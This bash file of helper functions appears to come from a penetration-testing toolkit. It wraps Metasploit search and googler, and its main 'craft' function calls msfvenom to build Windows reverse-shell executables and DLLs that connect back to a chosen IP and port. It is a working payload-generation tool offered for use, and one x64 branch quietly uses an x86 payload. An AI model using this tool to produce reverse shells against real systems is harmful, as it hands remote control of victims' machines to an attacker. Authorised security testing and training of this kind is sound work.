#!/bin/bash


# Description: metasploit version's searchexploit. 
# IMPORTANT: 
#   Although the function does use any auto-exploit/check module under Metasploit,
#   it seems there's still a little concerns of it. Therefore, the function is set to be able to disable
#   by global_settings.disable_auto_exploit_function
function msfsearch() {
    _disable_auto_exploit_function
    [ $? -eq 1 ] && return 1
    msfconsole -q -x "search $@; exit"
}

# Description: alternative wraps for googler
# Usage: google [-h, --help] <KEYWORD>
function google() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0
    _extension_fn_banner
    googler $@ --count 5 --np -x
}

# Description: Generate a reverse shell payload using msfvenom
# Usage: craft [-p PORT] [-a ARCH] [-i IP]
# Arguments:
#   - PORT: Port number for the reverse shell. (Default: see Configuration)
#   - ARCH: Architecture for the reverse shell (x86, x64, dll). (Default: see Configuration)
#   - IP: IP address for the reverse shell. (Default: see Configuration)
# Configuration:
#   - functions.craft.default_port: default LPORT you like.
#   - functions.craft.default_arch: default ARCH you like.
#   - functions.craft.generate_stage: create stage payloads. (can use concurrently with stageless)
#   - functions.craft.generate_stageless: create stageless payloads. (can use concurrently with stage)
# Example:
#   craft
#   craft -p 4444 -a x86
#   craft -i 192.168.1.1 -a x64
# References:
#   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
#   - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
# TODO: extends to Linux
function craft() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local ip=$(_get_default_network_interface_ip)
    local port="$_swiss_craft_default_port"
    local arch="$_swiss_craft_default_arch"
    local generate_stage=$_swiss_craft_generate_stage
    local generate_stageless=$_swiss_craft_generate_stageless

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip) ip="$2" && shift 2 ;;
            -p|--port) port="$2" && shift 2 ;;
            -a|--arch) arch="$2" && shift 2 ;;
            *) swiss_logger error "[e] Invalid option: $1. Check with -h, --help" && return 1 ;;
        esac
    done

    if [[ -z "$port" || -z "$arch" || -z "$ip" ]]; then
        swiss_logger error "[e] Port, IP, and architecture must be specified" && return 1
    fi

    swiss_logger info "[i] Creating binaries using ip = $ip, port = $port, arch = $arch"

    case $arch in
        x86)
            if [[ $generate_stage = true ]]; then
                _wrap msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage-$port.exe
            fi

            if [[ $generate_stageless = true ]]; then
                _wrap msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stageless-$port.exe
            fi
            ;;
        x64)
            if [[ $generate_stage = true ]]; then
                _wrap msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stage-$port.exe
            fi

            if [[ $generate_stageless = true ]]; then
                _wrap msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stageless-$port.exe
            fi
            ;;
        dll) _wrap msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o reverse-$port.dll ;;
        *) swiss_logger error "[e] Invalid architecture: $arch. Only x86, x64, and dll are supported." && return 1 ;;
    esac
}